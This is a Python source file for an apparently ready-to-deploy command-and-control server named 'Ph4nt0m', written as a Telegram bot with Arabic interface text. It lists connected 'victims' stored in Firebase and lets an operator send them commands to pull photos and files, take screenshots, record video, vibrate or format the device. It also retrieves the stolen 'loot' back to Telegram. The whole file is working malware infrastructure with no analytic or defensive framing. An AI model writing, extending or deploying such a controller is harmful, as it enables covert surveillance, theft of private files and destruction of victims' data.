#!/usr/bin/env python3
"""
Ph4nt0m Telegram C2 - Render Ready
"""
import os
import json
import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from firebase_admin import credentials, initialize_app, db

# ---------- قراءة المتغيرات من بيئة Render ----------
BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]

# محاولة قراءة ملف اعتماد إذا تم توفيره (اختياري)
firebase_creds = os.environ.get("FIREBASE_CREDS")
if firebase_creds:
    cred = credentials.Certificate(json.loads(firebase_creds))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}

# ---------- الدوال ----------
def get_online_victims():
    snap = victims_ref.get()
    if not snap:
        return {}
    return {k:v for k,v in snap.items() if v.get('online')}

async def send_file_to_telegram(update, data_b64, filename, caption):
    try:
        file_bytes = base64.b64decode(data_b64)
        await update.message.reply_document(document=file_bytes, filename=filename, caption=caption)
    except Exception as e:
        await update.message.reply_text(f"فشل إرسال الملف: {e}")

def get_panel_markup():
    keyboard = [
        [InlineKeyboardButton("📷 سحب الصور", callback_data='get_photos')],
        [InlineKeyboardButton("📁 سحب الملفات", callback_data='get_files')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot')],
        [InlineKeyboardButton("🎥 فيديو 10 ثوان", callback_data='record_video')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format')],
        [InlineKeyboardButton("📂 عرض المسروقات", callback_data='loot')],
        [InlineKeyboardButton("🚫 مسح الجلسة", callback_data='leave')]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ Ph4nt0m C2 Bot\n"
        "لرؤية الضحايا: /victims\n"
        "لاختيار ضحية: /use <id>\n"
        "لفتح لوحة التحكم: /panel\n"
    )

async def victims_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vics = get_online_victims()
    if not vics:
        await update.message.reply_text("لا توجد أجهزة متصلة.")
        return
    txt = "📟 الضحايا المتصلين:\n"
    for vid, info in vics.items():
        fg = info.get('fingerprint', {})
        txt += f"• {vid}\n  {fg.get('plat','?')} | {fg.get('ua','')[:50]}...\n\n"
    await update.message.reply_text(txt)

async def use_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /use <id>")
        return
    vid = context.args[0]
    vics = get_online_victims()
    if vid not in vics:
        await update.message.reply_text("معرّف غير متصل.")
        return
    current_victim[update.effective_user.id] = vid
    await update.message.reply_text(f"✅ تم اختيار {vid}\nافتح لوحة التحكم: /panel")

async def panel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    vid = current_victim.get(uid)
    if not vid:
        await update.message.reply_text("اختر ضحية أولاً: /use <id>")
        return
    await update.message.reply_text(f"🎛 الضحية: {vid}", reply_markup=get_panel_markup())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    vid = current_victim.get(uid)
    if not vid:
        await query.edit_message_text("انتهت الجلسة. اختر ضحية مجدداً: /use <id>")
        return
    action = query.data

    if action == 'leave':
        victims_ref.child(vid).remove()
        if current_victim.get(uid) == vid:
            del current_victim[uid]
        await query.edit_message_text("🚫 تم مسح الجلسة وفصل الضحية.")
        return

    if action == 'loot':
        loot = db.reference(f'victims/{vid}/loot').get()
        if not loot:
            await query.edit_message_text("لا توجد مسروقات بعد.")
            return
        items = list(loot.items())[-5:]
        await query.edit_message_text("📂 آخر 5 مسروقات:")
        for key, item in items:
            typ = item.get('type')
            name = item.get('name', typ)
            data = item.get('data')
            if data and typ in ('screenshot','video','file'):
                ext = 'png' if typ=='screenshot' else 'webm' if typ=='video' else ''
                await send_file_to_telegram(query, data, f"{name}.{ext}", f"📎 {name}")
            else:
                await query.message.reply_text(f"[{typ}] {name}")
        await query.message.reply_text("انتهى العرض.")
        return

    params = {}
    if action == 'vibrate':
        params['duration'] = 5000
    elif action == 'record_video':
        params['duration'] = 10
    cmd = {"action": action}
    cmd.update(params)
    db.reference(f'victims/{vid}/command').set(cmd)
    await query.edit_message_text(f"✅ تم إرسال الأمر: {action}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("victims", victims_cmd))
    app.add_handler(CommandHandler("use", use_cmd))
    app.add_handler(CommandHandler("panel", panel_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("🤖 Ph4nt0m Bot Started...")
    app.run_polling()

if __name__ == "__main__":
    main()
